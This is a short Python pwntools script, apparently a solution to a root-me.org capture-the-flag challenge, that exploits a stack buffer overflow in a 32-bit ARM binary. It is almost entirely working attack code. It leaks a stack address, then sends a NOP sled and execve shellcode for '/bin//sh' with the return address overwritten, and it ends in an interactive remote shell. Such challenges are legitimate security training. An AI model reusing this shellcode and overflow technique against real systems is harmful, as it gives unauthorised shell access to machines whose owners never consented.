from pwn import *

"""

ARM 32-bit BufferOverflow

    Arch:     arm-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x10000)
    RWX:      Has RWX segments
    FORTIFY:  Enabled

"""

w = remote("challenge04.root-me.org",61045)

context.update(arch='arm',bits=32,os='linux')
shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"

def get_addr():
	w.sendlineafter("\n","wally0813")
	return int(w.recvline()[:10],16)

def dump(d):
	w.sendlineafter(":","y")
	w.sendlineafter("dump:", d)

stack = get_addr()

print "--> stack addr :: "+hex(stack)
print "--> shellcode len :: "+str(len(shellcode))

shellcode = asm(shellcraft.nop())*20+shellcode
dump(shellcode.ljust(0xa4,"w")+p32(stack))
w.sendline("n")

w.interactive()
